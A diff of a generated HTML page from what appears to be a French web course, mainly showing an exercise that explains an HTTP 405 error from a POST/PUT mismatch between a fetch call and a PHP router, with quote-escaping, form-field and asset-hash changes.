-    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>Valider<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"code"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"Code à 6 chiffres"</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">"6"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span><span class="p">&gt;</span>Valider<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </code></pre></div>
 <p><strong>Points clés :</strong></p>
@@ -8011,23 +8011,23 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 </code></pre></div>
 <p>Il vous demande de l'aider à résoudre ce problème. Voici l'extrait du code source de l'appel à l'API :</p>
 <p>Client : </p>
-<div class="language-js highlight"><span class="filename">🍵 JavaScript</span><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+<div class="language-js highlight"><span class="filename">🍵 JavaScript</span><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">'https://api.example.com/data'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
 <span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application</span>
+<span class="w">        </span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application</span>
 <span class="s1">    },</span>
-<span class="s1">    body: JSON.stringify({name: &#39;</span><span class="nx">John</span><span class="w"> </span><span class="nx">Doe</span><span class="err">&#39;</span><span class="p">})</span>
+<span class="s1">    body: JSON.stringify({name: '</span><span class="nx">John</span><span class="w"> </span><span class="nx">Doe</span><span class="err">'</span><span class="p">})</span>
 <span class="p">});</span>
 </code></pre></div>
 <p>Serveur :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="c1">// Extrait du code du routeur</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@index&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/about&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@about&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;/contact&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@contact&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;/contact&#39;</span><span class="p">,</span> <span class="s1">&#39;HomeController@envoyer&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">put</span><span class="p">(</span><span class="s1">&#39;/data&#39;</span><span class="p">,</span> <span class="s1">&#39;DataController@ajouter&#39;</span><span class="p">);</span>
-<span class="nx">Route</span><span class="o">::</span><span class="na">delete</span><span class="p">(</span><span class="s1">&#39;/data&#39;</span><span class="p">,</span> <span class="s1">&#39;DataController@supprimer&#39;</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="s1">'HomeController@index'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/about'</span><span class="p">,</span> <span class="s1">'HomeController@about'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">'/contact'</span><span class="p">,</span> <span class="s1">'HomeController@contact'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">post</span><span class="p">(</span><span class="s1">'/contact'</span><span class="p">,</span> <span class="s1">'HomeController@envoyer'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">put</span><span class="p">(</span><span class="s1">'/data'</span><span class="p">,</span> <span class="s1">'DataController@ajouter'</span><span class="p">);</span>
+<span class="nx">Route</span><span class="o">::</span><span class="na">delete</span><span class="p">(</span><span class="s1">'/data'</span><span class="p">,</span> <span class="s1">'DataController@supprimer'</span><span class="p">);</span>
 </code></pre></div>
 <p>Expliquez à Antonin pourquoi il reçoit une erreur 405 et proposez une solution pour corriger ce problème.</p>
 <details class="question">
@@ -8041,17 +8041,17 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p><strong>Solution</strong></p>
 <p>Selon l'intention d'Antonin, deux options :</p>
 <p><strong>Option 1 : modifier la méthode côté client</strong> (si <code>PUT</code> est sémantiquement correct)</p>
-<div class="language-js highlight"><span class="filename">🍵 JavaScript</span><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://api.example.com/data&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;PUT&#39;</span><span class="p">,</span><span class="w">  </span><span class="c1">// Utiliser PUT comme défini dans le routeur</span>
+<div class="language-js highlight"><span class="filename">🍵 JavaScript</span><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">'https://api.example.com/data'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'PUT'</span><span class="p">,</span><span class="w">  </span><span class="c1">// Utiliser PUT comme défini dans le routeur</span>
 <span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span>
+<span class="w">        </span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/json'</span>
 <span class="w">    </span><span class="p">},</span>
-<span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;John Doe&#39;</span><span class="p">})</span>
+<span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s1">'John Doe'</span><span class="p">})</span>
 <span class="p">});</span>
 </code></pre></div>
 <p><strong>Option 2 : ajouter la route POST côté serveur</strong> (si POST est sémantiquement correct)</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">// Ajouter la route manquante</span>
-<span class="x">Route::post(&#39;/data&#39;, &#39;DataController@ajouter&#39;);</span>
+<span class="x">Route::post('/data', 'DataController@ajouter');</span>
 </code></pre></div>
 <p><strong>Rappel des méthodes HTTP et leur usage conventionnel :</strong></p>
 <table>
@@ -8081,7 +8081,7 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 </tbody>
 </table>
 <p><strong>Bonus :</strong> le header <code>Content-Type</code> dans le code client est incomplet (<code>'application</code> sans <code>/json'</code>). La ligne correcte est :
-<div class="language-js highlight"><span class="filename">🍵 JavaScript</span><pre><span></span><code><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span>
+<div class="language-js highlight"><span class="filename">🍵 JavaScript</span><pre><span></span><code><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/json'</span>
 </code></pre></div></p>
 </details>
 
@@ -8230,7 +8230,7 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
       <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.tabs", "navigation.expand", "navigation.top", "toc.integrate", "header.autohide", "content.code.annotate", "content.code.copy", "content.tooltips"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
         <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
       
